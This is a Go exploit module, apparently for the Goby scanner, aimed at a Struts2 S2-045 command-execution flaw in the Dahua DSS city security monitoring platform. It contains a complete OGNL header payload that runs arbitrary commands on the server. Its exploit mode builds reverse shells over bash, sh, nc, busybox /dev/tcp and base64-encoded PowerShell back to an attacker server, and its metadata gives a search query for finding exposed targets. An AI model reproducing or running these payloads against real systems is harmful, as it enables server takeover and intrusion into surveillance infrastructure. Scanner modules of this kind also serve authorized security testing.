package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "dahua-DSS city Security Monitoring Platform /admin/login_login.action Command Execution Vulnerability",
    "Description": "<p>The Dahua DSS city security monitoring platform has a Struct2-045 command execution vulnerability, which can be exploited by attackers to gain server privileges.</p>",
    "Product": "dahua-DSS",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2024-03-17",
    "PostTime": "2024-10-17",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"/portal/include/script/dahuaDefined/headCommon.js?type=index\"&&title=\"DSS\"",
    "GobyQuery": "body=\"/portal/include/script/dahuaDefined/headCommon.js?type=index\"&&title=\"DSS\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version:<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls. </p><p>3.If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8EDSS%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0Struct2-045%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBash,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "大华 DSS 城市安防监控平台 /admin/login_login.action 命令执行漏洞",
            "Product": "dahua-DSS",
            "Description": "<p>大华DSS城市安防监控平台存在Struct2-045命令执行漏洞，攻击者可以利用此漏洞获取服务器权限。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "dahua-DSS city Security Monitoring Platform /admin/login_login.action Command Execution Vulnerability",
            "Product": "dahua-DSS",
            "Description": "<p>The Dahua DSS city security monitoring platform has a Struct2-045 command execution vulnerability, which can be exploited by attackers to gain server privileges.<br></p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version:<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3.If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
  //command为原始命令，如果需编码，请自行编码后使用
  
  //漏洞url地址
  vulPath := "/admin/login_login.action"
  postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
  postRequestConfig.VerifyTls = false
  postRequestConfig.FollowRedirect = false
  
  //请求头
  head := map[string]string{
    "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+ command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
  }

  for headName, headValue := range head {
    postRequestConfig.Header.Store(headName, headValue)
  }
  //请求
  response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
  if err != nil || response == nil {
    return "", "", err
  } //错误检查
  
  return response.RawBody, vulPath, nil
}

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  //poc验证函数
  func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    //setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
    runPayload := setPayloadRequestHashQgLPm6r9

    text := goutils.RandomHexString(16)
    pocCommand := `echo ` + text
    pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
    if err != nil {
      return false
    }
    if strings.Contains(pocRuselt, text) {
      ss.VulURL = hostInfo.FixedHostInfo + pocUrl
      return true
    }
    return false
  },
  //exp利用函数
  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    //setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
    runPayload := setPayloadRequestHashQgLPm6r9

    setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
      select {
      case webConsleID := <-waitSessionCh:
        if u, err := url.Parse(webConsleID); err == nil {
          expResult.Success = true
          expResult.OutputType = "html"
          sid := strings.Join(u.Query()["id"], "")
          expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
        } else {
          expResult.Success = false
          expResult.Output = "reverse shell fail"
        }
      case <-time.After(time.Second * 25):
      }
    }

    ReverseTcpByBusyBox := func(rp string) string {
      return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
    }

    setReverseRequest := func(reverseType string) (string, chan string, error) {
      typeList := map[string]func(string) string{
        "ByBash":             godclient.ReverseTCPByBash,
        "ByBashBase64":       godclient.ReverseTCPByBash,
        "ByPowershell":       godclient.ReverseTCPByPowershell,
        "ByPowershellBase64": godclient.ReverseTCPByPowershell,
        "BySh":               godclient.ReverseTCPBySh,
        "ByNcBsd":            godclient.ReverseTCPByNcBsd,
        "ByBusyBox":          ReverseTcpByBusyBox,
      }
      if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
        return "", nil, errors.New("vaild exsploit")
      }
      waitSessionCh := make(chan string)

      if strings.Contains(reverseType, "ByPowershell") {
        if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
          command := typeList[reverseType](rp)
          if reverseType == "ByPowershellBase64" {
            utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
            bytes := make([]byte, len(utf16Bytes)*2)
            for i, v := range utf16Bytes {
              bytes[i*2] = byte(v)
              bytes[i*2+1] = byte(v >> 8)
            }
            command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
          }
          return command, waitSessionCh, nil
        }
      } else {
        if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
          command := typeList[reverseType](rp)
          if reverseType == "ByBashBase64" {
            command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
          }
          return command, waitSessionCh, nil
        }
      }
      return "", waitSessionCh, errors.New("gain command fail")
    }

    attackType := goutils.B2S(ss.Params["attackType"])
    switch attackType {
    case "cmd":
      //配置命令
      command := goutils.B2S(ss.Params["cmd"])
      Result, _, err := runPayload(expResult.HostInfo, command)

      if err != nil {
        expResult.Success = false
        expResult.Output = err.Error()
        return expResult
      }

      if len(Result) > 0 {
        expResult.Success = true
        expResult.Output = Result
      } else {
        expResult.Success = false
        expResult.Output = err.Error()
      }
    case "reverse":
      //配置反弹shell的类型
      reversetype := goutils.B2S(ss.Params["reverse"])
      if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
        go runPayload(expResult.HostInfo, command)
        setReverseWaitting(expResult, waitSessionCh)
      } else {
        expResult.Success = false
        expResult.Output = err.Error()
      }
    default:
      expResult.Success = false
      expResult.Output = `未知的利用方式`
    }
    return expResult
  },
))
}